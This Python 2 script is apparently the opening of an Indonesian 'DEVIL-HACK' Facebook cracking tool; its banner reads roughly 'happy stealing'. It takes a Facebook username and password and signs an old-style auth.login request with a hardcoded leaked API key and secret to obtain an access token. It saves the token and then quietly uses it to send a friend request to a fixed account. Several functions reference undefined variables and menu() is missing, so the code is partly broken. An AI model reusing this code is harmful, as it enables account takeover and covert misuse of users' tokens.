#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
=—————————————————————————————=
                    ╔════╗────╔╗
                    ║╔╗╔╗║───╔╝╚╗
                    ╚╝║║╠╩═╦═╬╗╔╬══╗
                    ──║║║╔╗║╔╗╣║║║═╣
                    ──║║║╔╗║║║║╚╣║═╣
                    ──╚╝╚╝╚╩╝╚╩═╩══╝
=—————————————————————————————=
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[Tunggu Bodoh \x1b["+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "Not Vuln"
vuln = "Vuln"

os.system("clear")
print("•◈•───────•◈ GAK NGEWE GAK ASYIK ◈•───────•◈•")
jalan("     SELAMAT MALING ANJING ")
print("•◈•──────────•◈• DEVIL-HACK •◈•──────────•◈•")




CorrectUsername = "rana"
CorrectPassword = "rana"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] Username >>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] Password >>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.facebook.com/DEVILS69JAVHD')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.facebook.com/DEVILS69JAVHD')


def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		
		print('          [◉] LOGIN MENGGUNAKAN AKUN BARU [◉]' )
		id = raw_input('     [◉] Username/Email : ')
		pwd = raw_input('[◉] Password : ')
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;97m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


